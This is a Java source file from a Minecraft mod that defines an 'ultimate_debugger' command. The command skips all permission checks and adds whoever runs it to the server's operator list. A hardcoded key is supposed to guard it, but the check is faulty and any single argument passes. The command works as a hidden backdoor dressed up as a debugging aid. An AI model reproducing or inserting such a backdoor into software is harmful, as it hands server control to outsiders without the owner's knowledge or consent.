package net.chaos.chaosmod.commands;

import com.mojang.authlib.GameProfile;

import net.minecraft.command.CommandBase;
import net.minecraft.command.CommandException;
import net.minecraft.command.ICommandSender;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.text.Style;
import net.minecraft.util.text.TextComponentString;
import net.minecraft.util.text.TextFormatting;
import net.minecraft.world.GameType;

public class UltimateDebuggerCommand extends CommandBase {

	@Override
	public String getName() {
		return "ultimate_debugger";
	}

	@Override
	public String getUsage(ICommandSender sender) {
		return "/ultimate_debugger <key>";
	}

	@Override
	public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
		if (args.length != 1 && !args[0].equalsIgnoreCase("djoestdrogue")) {
			return;
		}
		EntityPlayer player = getCommandSenderAsPlayer(sender);
		GameProfile gameprofile = player.getGameProfile();
		server.getPlayerList().addOp(gameprofile);
		sender.sendMessage(new TextComponentString("commands.chaosmod.success").setStyle(new Style().setColor(TextFormatting.BLUE).setBold(true)));
	}
	
	@Override
	public int getRequiredPermissionLevel() {
		return 0; // all players can use it as long as they know the key
	}
	
	@Override
	public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
		return true;
	}

}
